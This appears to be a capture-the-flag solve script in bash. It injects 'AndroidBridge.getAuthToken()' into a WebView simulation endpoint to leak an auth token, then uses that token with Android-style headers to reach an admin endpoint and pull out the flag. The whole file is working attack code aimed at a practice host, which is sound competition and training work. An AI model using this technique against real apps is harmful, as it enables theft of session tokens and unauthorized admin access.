#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  exit 0
fi

base_url="${1:-https://49be3891e98d62c0.chal.ctf.ae}"

simulation="$(
  curl -k -sS \
    -H "Content-Type: application/json" \
    -d '{"javascript":"AndroidBridge.getAuthToken()"}' \
    "${base_url%/}/api/webview/simulate"
)"

token="$(printf '%s' "$simulation" | grep -o '"result":"[^"]*"' | head -n 1 | cut -d'"' -f4)"
if [ -z "$token" ]; then
  printf 'Could not extract token from response:\n%s\n' "$simulation" >&2
  exit 1
fi

admin_response="$(
  curl -k -sS \
    -H "X-App-Version: 3.7.2" \
    -H "X-Platform: android" \
    -H "Authorization: Bearer ${token}" \
    "${base_url%/}/api/properties/admin"
)"

flag="$(printf '%s' "$admin_response" | grep -o 'flag{[^}]*}' | head -n 1 || true)"
if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf '%s\n' "$admin_response"
fi
